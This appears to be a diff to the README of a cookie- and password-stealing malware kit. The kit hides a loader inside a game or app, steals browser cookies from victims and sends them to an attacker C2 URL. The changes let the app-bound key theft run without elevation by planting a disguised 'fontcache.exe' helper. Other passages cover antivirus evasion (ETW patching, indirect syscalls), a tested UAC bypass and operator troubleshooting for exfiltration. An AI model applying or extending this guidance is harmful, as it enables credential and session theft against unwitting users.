@@ -186,10 +186,12 @@ There is no build step on Linux by design: the victim-side binaries ship prebuil
   the payload (`build.bat`)
 - **Python deps:** `pip install -r requirements.txt` -- installs `cryptography` (DPAPI /
   AES-GCM for `cookielog.py`) and `websocket-client` (CDP, legacy live mode)
-- **Elevated context** -- the Chrome/Edge v20 key stage writes a helper into the browser's
-  `Application` directory, so the loader only runs it when its own token is elevated.
-  Without that, v10/v11 stores, Firefox and the CEF apps are still collected and the
-  app-bound browsers are reported as `no-key`. `bin\ckkey.exe /quiet` is the manual path.
+- **Write access to the browser's install tree** -- the Chrome/Edge v20 key stage writes a
+  helper into the browser's `Application` directory, so the loader probes that directory with
+  a real create/delete and runs the stage only where the write succeeds. A per-user Chromium
+  install (`%LOCALAPPDATA%`, e.g. Vivaldi or a per-user Chrome) needs no elevation; a system
+  install under `Program Files` is skipped and reported as `no-key`, while v10/v11 stores,
+  Firefox and the CEF apps are still collected. `bin\ckkey.exe /quiet` is the manual path.
   `tools\PsExec64.exe` is only for the legacy `cookielog.py --v20-sys` flow.
 
 ---
@@ -212,8 +214,8 @@ The end-to-end infection and exfiltration chain:
 4. **Victim runs it.** The host app/game opens normally (rename-restore preserves the original
    exe name, which Unity games require). The loader then maps the payload into itself and
    runs it on a background thread -- the loader process stays resident until extraction
-   finishes. If the loader token is elevated it first runs the v20 key stage described
-   under *Chromium cookie decryption*.
+   finishes. It first runs the v20 key stage described under *Chromium cookie
+   decryption*, for every browser whose install tree it can write.
 5. **Extraction.** The payload extracts cookies from Chrome / Edge / Brave / Vivaldi / Opera
    (Chromium-based) and Firefox on the **victim's** machine.
 6. **Exfiltration.** The payload POSTs the cookies to the attacker's C2 URL as
@@ -344,9 +346,10 @@ Stage 2 writes the decrypted key to `C:\ProgramData\MediaCache\mc.key`, which st
 The mapped payload has the same unlock built in (v11): `loader.exe` embeds `ckdec.exe`,
 discovers the installed browser's Elevation Service CLSID under `Classes\CLSID`, deploys the
 helper into the browser's `Application` directory, and writes the raw key to
-`C:\ProgramData\MediaCache\mc-<browser>.key`. It only runs when the loader token is elevated
-(the write target is Program Files); otherwise the payload reports the store as `no-key`.
-The `--v20-*` flow above remains the manual route when the payload cannot elevate.
+`C:\ProgramData\MediaCache\mc-<browser>.key`. The gate is write access to that directory
+(probed with a real create, v14), not an elevated token: a per-user install is serviceable
+at medium IL, and a system install under Program Files reports `no-key`.
+The `--v20-*` flow above remains the manual route where the loader cannot write.
 
 ### `session_break.py` -- session cookie extractor + cryptanalysis
 
@@ -872,7 +875,8 @@ Chromium stores cookie values encrypted with AES-256-GCM:
    `Application` directory with an impersonation-level proxy blanket.
 
 The payload cannot do that from the mapped image; the loader does it before mapping (v11,
-self-injection in v13). `loader.exe` carries `ckdec.exe` as RCDATA and, when elevated:
+self-injection in v13). `loader.exe` carries `ckdec.exe` as RCDATA and, for every browser it
+can write to:
 
 1. Finds `Local State` under `%LOCALAPPDATA%` (then `%APPDATA%`) for each Chromium browser
    and extracts the base64 `app_bound_encrypted_key`.
@@ -881,14 +885,17 @@ self-injection in v13). `loader.exe` carries `ckdec.exe` as RCDATA and, when ele
 3. Walks `HKLM` and `HKCU` `SOFTWARE\Classes\CLSID`, opens each `LocalServer32`, and matches
    `elevation_service.exe` paths under that browser's `Application` directory. The CLSID
    string is passed to the helper, so Chrome, Edge, Brave and other forks share one build.
-4. Writes the helper as `<Application>\fontcache.exe`, passes the blob and CLSID, waits for
+4. Probes the `Application` directory with a create/delete of `.ckprobe.<pid>`. Services run
+   only where the write succeeds -- a per-user install passes at medium IL, a Program Files
+   install does not.
+5. Writes the helper as `<Application>\fontcache.exe`, passes the blob and CLSID, waits for
    `DecryptData`, and keeps the raw 32-byte key as `mc-<browser>.key`.
-5. Deletes the helper, the intermediate blob, and any stale key from an earlier run.
+6. Deletes the helper, the intermediate blob, and any stale key from an earlier run.
 
-The stage is gated on an elevated token because the write target is Program Files. A
-non-elevated run skips it and the coverage manifest reports the browser as `no-key`; the
-v10/v11 key remains usable for stores that still have one. `bin\ckkey.exe /quiet` performs
-the same unlock manually.
+The stage is not gated on the process token (v14): an elevated token says nothing about an
+ACL, and a medium-IL process still owns its per-user install. Browsers that fail the probe
+are reported as `no-key` and the v10/v11 key remains usable for stores that still have one.
+`bin\ckkey.exe /quiet` performs the same unlock manually.
 
 **Chrome >=118 domain hash prefix.** Both v10 and v20 cookies have a 32-byte
 `SHA256(host_key)` hash prepended to the decrypted plaintext. The payload verifies this by
@@ -982,7 +989,7 @@ must never kill the loader while the payload is working.
 | WinHTTP error `12029` | WinHTTP/WinINet fail inside a manually mapped payload (proxy config unavailable) | The payload uses Winsock2, not WinHTTP -- rebuild `ckdll.dll` if you hit this (current code already uses Winsock2) |
 | Loader process stays running for the whole extraction | v13 self-injection: the payload runs as a thread inside `loader.exe`, so the process must outlive the run | Expected. `--run` waits for it (6 min watchdog); killing the loader aborts the extraction |
 | Cookies not received by listener | `listen.py` not running, wrong C2 URL, or firewall blocking the port | Confirm `listen.py` is up, the C2 URL matches `http://<attacker-ip>:<port>/`, and the port is open in the firewall |
-| No Chromium cookies decrypted on Chrome/Edge >=127, coverage says `no-key` | v20 app-bound key absent. The loader's key stage needs an elevated token because it writes the helper into the browser's `Application` directory | Run the package from an elevated context; otherwise use `bin\ckkey.exe /quiet` on the victim (or the legacy `cookielog.py --v20-sys` + `--v20-usr` flow) to generate the key, then re-extract |
+| No Chromium cookies decrypted on Chrome/Edge >=127, coverage says `no-key` | v20 app-bound key absent. The loader's key stage writes the helper into the browser's `Application` directory, and the probe shows that directory is not writable by the current user | Per-user installs need no elevation and should just work; for a `Program Files` install use `bin\ckkey.exe /quiet` on the victim (or the legacy `cookielog.py --v20-sys` + `--v20-usr` flow) to generate the key, then re-extract |
 | `DumpChromium: copy failed (browser running?)` | Browser holds a 0-sharing lock on the cookie DB (`CopyFileShared` failed, error 32) | The payload falls back to handle hijacking automatically. If hijack also fails, check `cache.log` (DEBUG builds) for `HijackCookieDB` messages |
 | Invalid JSON at listener (`Invalid control character`) | Old payload used raw `Put()` (no escaping) for password values -- binary chars in decrypted passwords break JSON | Fixed in current build (`PutJ()`). Rebuild with `build.bat` |
 | DPAPI failed (`CryptUnprotectData` returns false) | Running as a different user than the profile owner | Run the extraction in the target user's context (DPAPI keys are per-user) |
@@ -1028,7 +1035,8 @@ Full version history in **[CHANGELOG.md](CHANGELOG.md)**.
 
 | Version | Highlights |
 |---|---|
-| **v13** (current) | Self-injection: payload mapped into loader.exe (no notepad hollowing), indirect `Nt*` syscalls from ntdll SSNs + `syscall; ret` gadget, `EtwEventWrite` patch, header wipe, `MicrosoftSignedOnly` mitigation, `.pdata` registration, base-relocation fallback; `auto.py`/`pick.py` wait for payload completion |
+| **v14** (current) | Key stage gated on a directory write probe instead of the process token: per-user Chromium installs (Vivaldi, Brave, per-user Chrome) unwrap app-bound keys at medium IL; the fodhelper/computerdefaults ms-settings bypass was implemented, tested and removed (Defender `Behavior:Win32/UACBypassExp.T!gen` kills the loader itself) |
+| v13 | Self-injection: payload mapped into loader.exe (no notepad hollowing), indirect `Nt*` syscalls from ntdll SSNs + `syscall; ret` gadget, `EtwEventWrite` patch, header wipe, `MicrosoftSignedOnly` mitigation, `.pdata` registration, base-relocation fallback; `auto.py`/`pick.py` wait for payload completion |
 | v12 | TLS 1.2 C2 in the payload (schannel, chain + hostname validation, caller-owned token buffers), record-boundary chunking with per-chunk `200` ACKs, listener `--tls-cert/--tls-key`, https-aware `auto`/`c2auth`, VPS bootstrap TLS default |
 | v11 | v20 key stage folded into the loader: embedded `ckdec` helper, CLSID discovery, elevated gate, non-elevated skip |
 | v10 | Coverage manifests (`records` + `coverage`), CEF/Electron stores, Firefox sessionstore parsing, password discovery by profile |
